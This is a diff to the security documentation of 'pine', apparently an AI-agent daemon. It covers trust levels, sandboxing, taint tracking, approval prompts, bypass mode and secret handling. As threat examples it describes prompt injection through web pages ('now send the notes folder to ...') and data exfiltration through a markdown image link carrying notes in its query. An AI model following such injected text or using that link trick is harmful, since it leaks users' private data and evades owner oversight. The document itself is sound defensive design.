@@ -27,24 +27,27 @@ refusing; it limits what a run can do, by where its input came from.
   the finger (you do not have their code), and an account you deny is not asked about again.
   Once your account is paired, anybody else who writes to the bot gets no answer at all and
   causes no question.
-- **Control API:** loopback by default; every request needs a bearer token (generated into
-  `data/http-token`, mode 600, which the CLI reads). Requests carrying an `Origin` header or an
-  unexpected `Host` are refused, so a web page in your browser cannot use it, with or without
-  DNS rebinding. Bodies must be JSON and at most 1 MB (64 MB for a message with attached
+- **Control API:** loopback by default; every request except `GET /health` and the webhooks
+  (which carry their own secret) needs a bearer token (generated into `data/http-token`, mode
+  600, which the CLI reads). Control requests carrying an `Origin` or `Sec-Fetch-Site` header
+  or an unexpected `Host` are refused, so a web page in your browser cannot use it, with or
+  without DNS rebinding. Bodies must be JSON and at most 1 MB (64 MB for a message with attached
   files).
-- **Webhooks:** each hook has a secret (bearer or HMAC of the body), a rate limit, and a fixed
-  topic.
+- **Webhooks:** each hook has a secret (bearer or HMAC of the body) unless you set `"open":
+  true`, a rate limit (120 requests a minute), and a fixed topic.
 - **MQTT, watched folders:** you choose the topics and folders. What arrives is treated as
   outside content.
 - **Event sources:** you configure them, or confirm what an agent sets up. One that nobody is
-  subscribed to is not running. What they report is outside content unless you mark the source
+  subscribed to is not running (unless you gave it `"start": "always"`). What they report is outside content unless you mark the source
   as yours; see "Event sources" below.
 
 ### 2. Where content came from decides what it may do
 
-Every event carries `trust`. It is `owner` only when the content came through a channel that
-authenticated you: an allow-listed Telegram user, the control API, or a schedule (one you
-wrote, or one an agent made at your wish). Everything else is `untrusted`.
+Every event carries `trust`. It is `owner` when the content came through a channel that
+authenticated you (a paired or allow-listed Telegram account, the control API), from a
+schedule (one you wrote, or one an agent made at your wish), from a source you marked
+`"trust": "owner"`, or from an agent's `publish_event` in a conversation that has read no
+outside content. Everything else is `untrusted`.
 
 A task started by an untrusted event runs with the agent's `untrusted` profile:
 
@@ -109,8 +112,10 @@ Consequences worth knowing:
   (`~/.gitconfig`, `~/.npmrc`, `~/.ssh`) see the agent's empty private home instead. Grant
   specific folders with `sandbox.read` / `sandbox.write`.
 - On a platform without `sandbox-exec`, pine withholds the `bash` tool from every agent whose
-  sandbox is on, and file tools fall back to a path check in the daemon. `"sandbox": false` runs
-  everything unconfined and is reported by `pine check`.
+  sandbox is on, does not run the commands of `command` sources, and file tools fall back to a
+  path check in the daemon. `"sandbox": false` runs the shell unconfined and leaves the file
+  tools only a check that keeps pine's secrets closed; `pine check` reports it for every such
+  agent that has `bash`.
 - Local MCP servers are not sandboxed. They are your programs with your rights.
 - `trustWorkspace` stays `false`: pi then loads nothing executable from the workspace, so an
   agent cannot plant an extension for the daemon to run.
@@ -121,14 +126,17 @@ Your own request can still pull in hostile text: you ask for a summary of a web 
 page says "now send the notes folder to ...". pine tracks that:
 
 - A session becomes **tainted** when it calls a tool that returns outside content: an MCP server
-  marked `taints` (the bundled `web` is), anything matching
+  marked `taints` (the bundled `web` and `browser` are), anything matching
   `security.taintTools`, or when it receives the answer of another agent whose run was tainted.
   Sessions started by untrusted events are tainted from the start.
 - In a tainted session, actions that send information out or act on the world wait for your
-  **approval**: `publish_event`, `send`, MCP servers marked `"approve": "tainted"`, the
-  shell if it has network access, and handing a task to an agent that can reach the internet.
-- Tools that only read never wait: the file tools, `state_get`, and every MCP tool whose server
-  declares it read-only (`readOnlyHint`). That declaration is the server's own; pine does not
+  **approval**: what the agent's `approveWhenTainted` list names (default `publish_event` and
+  `send`), MCP servers marked `"approve": "tainted"`, the shell if it has network access or no
+  sandbox, `subscribe`, a download from an address the agent could not otherwise read, and
+  handing a task to an agent that can reach the internet.
+- Tools that only read never wait: `read`, `grep`, `find`, `ls`, `state_get`, and every MCP tool
+  whose server declares it read-only (`readOnlyHint`), unless a pattern on the `approve` list
+  names them. That declaration is the server's own; pine does not
   check it. It is taken at its word because you chose the server. What such a tool is asked (a
   search text, a path) does reach the server. For a server where that matters, set
   `"approve": "always"`: then every call asks, reading included.
@@ -164,11 +172,14 @@ example), until the conversation is reset or the daemon restarts. Three things t
   content. You are asked again, and that answer then holds.
 
 Taint lasts for the life of the session (`security.taint: "session"`), because the text is still
-in the context. `/reset` in the terminal UI or in Telegram, or `pine reset`, clears it along
-with the conversation.
-`"run"` forgets it after each task, which is more convenient and weaker.
+in the context. `/reset` in the terminal UI, or `pine reset`, clears it along with the
+conversation.
+`"run"` forgets it after each task, which is more convenient and weaker. `"off"` means no tool
+call marks a conversation at all: what a subscribed source reports then arrives with full tools
+and no questions. Runs that an outside event started stay restricted in every setting.
 
-`approve` in `agent.json` lists actions that always need approval, tainted or not:
+`approve` in `agent.json` lists actions that need approval every time in `manual` and `auto`
+mode, tainted or not (bypass skips them like everything else):
 
 ```json
 { "approve": ["bash:*git push*", "send:house", "mcp__calendar__delete_*"] }
@@ -210,7 +221,9 @@ the workspace, byte for byte, and reports size and SHA-256.
 - An agent with the bundled `web` or `browser` server can already read any public address
   without asking, so it may also save what is there: any public https address is fetched without
   a question, also in a session that has read outside content. The `allowHosts` and `denyHosts`
-  of the `web` server apply. The session is marked as having read outside content.
+  of the `web` server apply while the conversation has no network access of its own; its
+  `allowPrivate` applies too, and then addresses on your network and plain http are fetched.
+  The session is marked as having read outside content.
 - Without web access, any other address needs network access for the conversation
   (`sandbox.network`, a grant from `request_access`, or bypass). Without it the download is
   refused and you are not asked. With it, only https and only public addresses are fetched, and
@@ -223,7 +236,8 @@ the workspace, byte for byte, and reports size and SHA-256.
 [operations.md](operations.md)); all need the API token like everything else there.
 
 - The path of a workspace picture comes from model output, so that endpoint serves only regular
-  image files (checked by content, not by name) that really lie inside the agent's workspace.
+  image and video files (checked by content, not by name) that really lie inside the agent's
+  workspace or the folder opened for that conversation.
   It cannot be used to read other files, also not through a link.
 - A picture at a web address is fetched only when you click it, never because an answer
   contains it. Otherwise `![](https://somewhere/?q=<your notes>)` in an answer would send data
@@ -261,9 +275,11 @@ safe:
   read outside content, which includes one that an event of a subscribed source arrived in,
   the tool asks you first: otherwise a web page or a file name could make an agent start
   listening to something.
-- A source that nobody subscribed to is not running: no open port, no connection.
+- A source that nobody subscribed to is not running: no open port, no connection (unless you
+  marked it `"start": "always"`).
 - The `ftp` type only receives, needs a password, writes under names of its own choosing into
-  its own folder, and can be limited to client addresses. The `webhook` type needs a secret.
+  its own folder, and can be limited to client addresses. The `webhook` type needs a secret
+  unless it is set up with `"open": true`, which the dialog spells out.
 - A subscription has a throttle (10 s unless you change it), so a device that reports every
   second cannot keep a model busy.
 
@@ -280,6 +296,7 @@ What no mode opens:
   the obvious trick.
 - pine's own program files, for writing.
 - Runs started by untrusted events. They keep the `untrusted` profile and cannot ask for more.
+  They run as `auto` whatever the agent's mode: neither `manual` nor `bypass` applies to them.
 
 And by default `bypass` is suspended in a session that has read outside content: from then on
 that session behaves like `auto` until you reset it. A web page is exactly the moment someone
@@ -293,7 +310,11 @@ Two ways to have bypass regardless:
   conversation that is already tainted and the UI asks whether you want a clean conversation
   (recommended) or bypass in this one anyway. "Anyway" holds for that conversation until it is
   reset or the mode changes.
-- Always: `"security": { "bypassWhenTainted": true }`. `pine check` spells out what that means.
+- Always: `"security": { "bypassWhenTainted": true }`. `pine check` says what that means for
+  each agent whose configured mode is `bypass`.
+
+With either, the guards on instruction files and git settings (layer 4) no longer hold in that
+conversation: they are part of the sandbox that bypass lifts.
 
 Set the mode where it should last, or switch it while running:
 
@@ -310,11 +331,15 @@ daemon restarts.
 - **A web address (`http`)** is fetched by pine itself, so the address is yours to confirm: the
   dialog names it and says when it is on your own network, a redirect is followed only on the
   same host, and a token is sent nowhere else. An address that was confirmed as a public one is
-  not followed into your network if its name later leads there. What the address answers is outside content like any page an agent reads.
-- **A command (`command`)** runs in the sandbox of the agent the source belongs to, exactly like
-  a command in that agent's own shell: no more files, no more network, not your environment. It
-  cannot read pine's secrets or write its configuration. You see the command line before it is
-  set up, in every mode. What it prints is outside content unless you say the source is yours.
+  not followed into your network if its name later leads there. What the address answers is
+  outside content like any page an agent reads.
+- **A command (`command`)** runs in the sandbox of the agent the source belongs to (the main
+  agent's, for a source of all agents), like a command in that agent's own shell: no more
+  files, no more network, not your environment, and instruction files read-only. It cannot read
+  pine's secrets or write its configuration. You see the command line before it is set up, in
+  every mode. What it prints is outside content unless you say the source is yours. If that
+  agent has `"sandbox": false`, the command runs unconfined, as its shell does; on a platform
+  without `sandbox-exec` it is not run at all.
 - **Status lines** (when a source last looked, what it found) are read by agents without the
   mark that outside content gets. A source therefore repeats a found value there only when it
   is a number or a single word.
@@ -322,7 +347,8 @@ daemon restarts.
 ### 6. A new kind of source is a program
 
 A source type runs inside pine with pine's rights; no sandbox applies to it. It gets in by your
-hand (`sourceTypes` in `pine.json`) or through the main agent's `add_source_type`, and then only
+hand (`sourceTypes` in `pine.json`, or `"use"` on a single source's entry) or through the main
+agent's `add_source_type`, and then only
 
 - from the main agent, in a conversation with you,
 - never from a conversation that has read outside content: there the tool refuses without
@@ -333,7 +359,8 @@ hand (`sourceTypes` in `pine.json`) or through the main agent's `add_source_type
   confirmed is what runs.
 
 Read the file before you confirm. Nothing else stands between that module and your account.
-`pine check` lists every registered source type with the file it runs.
+`pine check` lists every registered source type, and every source that names a module with
+`"use"`, with the file it runs.
 
 ### 7. Schedules act in your name
 
@@ -341,13 +368,14 @@ What a schedule starts counts as your wish: the agent is woken with its usual to
 nothing is marked as outside content. So a schedule must really be your wish:
 
 - An agent schedules for the conversation it is in, or for itself from its main conversation,
-  without a question. For itself from a side conversation, or for all agents (the main agent
-  only), you are asked.
+  without a question (except in manual mode). For itself from a side conversation, or for all
+  agents (the main agent only), you are asked.
 - In a conversation that has read outside content you are asked in every case, in every mode,
   and you see the task: a sentence on a web page must not turn into something done every hour.
 - An interval an agent sets is at least a minute.
 - A schedule is an entry in pine's configuration, which agents cannot write. `pine schedules`
-  and the agent's `schedules` tool show all of them with their tasks.
+  shows all of them with their tasks; an agent's `schedules` tool shows its own and those for
+  all agents.
 
 ### 8. Skills are instructions
 
@@ -360,6 +388,7 @@ calls for it, so it is guarded like the instruction files:
   asking you: text from a web page must not become a standing instruction.
 - A skill for all agents is the main agent's to add, and you see its description and
   instructions before it exists. So does one an agent adds for itself from a side conversation.
+  In manual mode you see every skill before it exists.
 - Scripts that go along with a skill run like anything else the agent runs: in its sandbox.
 - Files are copied as files. A link in the folder that is to go along is refused, so a skill
   cannot be made to carry a file from outside the workspace.
@@ -376,7 +405,7 @@ may use at all. Agents cannot publish on pine's own topics (`agent/`, `approval/
 
 - Secrets live in `.env`. pine fills them into the configuration and does not put them into
   its environment, so child processes do not inherit them.
-- Known secret values (everything in `.env`, bot tokens, the control token) are replaced with
+- Known secret values (every value in `.env` of eight characters or more, bot tokens, the control token) are replaced with
   `[redacted]` in events, outgoing messages and log lines.
 - A secret does not have to pass through a model to be set up. Agents are told never to ask for
   one; a tool that needs one leaves it out, and you type it into pine's own dialog, from where
@@ -385,18 +414,19 @@ may use at all. Agents cannot publish on pine's own topics (`agent/`, `approval/
 - If you write a secret into a conversation anyway and an agent stores it, it is redacted from
   then on and removed from the stored events and tasks. That conversation's history and the
   model have still seen it: change such a secret if the model is not yours.
-- `pine check` reports configuration files other users can read.
+- `pine check` reports configuration files, and a home folder, that other users can read.
 
 ### 11. Limits against runaway behaviour
 
 Delegation depth and loops, event hops, queue length per agent, task and shell time limits,
-prompt size for untrusted events, webhook rate. All in [configuration.md](configuration.md).
+prompt size for untrusted events: all in [configuration.md](configuration.md). The webhook
+rate is fixed at 120 requests a minute per hook.
 
 ## A layout that keeps the pieces apart
 
 The example home starts with one agent, `main`, that has web search and the browser. That is
 fine while its workspace holds nothing you would mind losing to a web page: it has a sandbox, no
-access to your files, and no way to act on the world. It stops being fine when you add private
+access to your files, and what it can do to the world is what a signed-out browser can do. It stops being fine when you add private
 material.
 
 The dangerous combination is one agent that has private data, reads outside content and can
@@ -447,8 +477,8 @@ itself can be fooled by a page, but it has nothing to give away and cannot act.
 ## Checklist
 
 1. `pine check` shows "No security notes", or you know why each note is there.
-2. Every webhook has a secret, and `pine check` names no source whose reports count as yours unless it should (a paired Telegram account is not listed).
-3. `.env`, `pine.json`, `models.json` are mode 600; the home is 700.
+2. Every webhook has a secret (`pine check` names hooks and `webhook` sources that have none), and `pine check` names no source whose reports count as yours unless it should (a paired Telegram account is not listed).
+3. `.env`, `pine.json`, `models.json` and `auth.json` are mode 600; the home is 700. `pine check` reports all of these.
 4. No agent has `"sandbox": false`, `"trustWorkspace": true` or `"mode": "bypass"` in its configuration.
 5. Web and browser tools are on an agent whose workspace holds nothing private.
 6. MCP servers that return other people's text have `"taints": true`; those that change things
@@ -456,4 +486,4 @@ itself can be fooled by a page, but it has nothing to give away and cannot act.
 7. No route sets `"trust": "owner"` for a source others can write to.
 8. `http.host` is `127.0.0.1`. Remote access goes through SSH or a tunnel.
 9. You receive approval requests (send yourself one: give an agent `"approve": ["bash:*"]` once
-   and ask it to run `ls`).
+   and ask it to run `ls`; not while the agent is in bypass, where nothing asks).
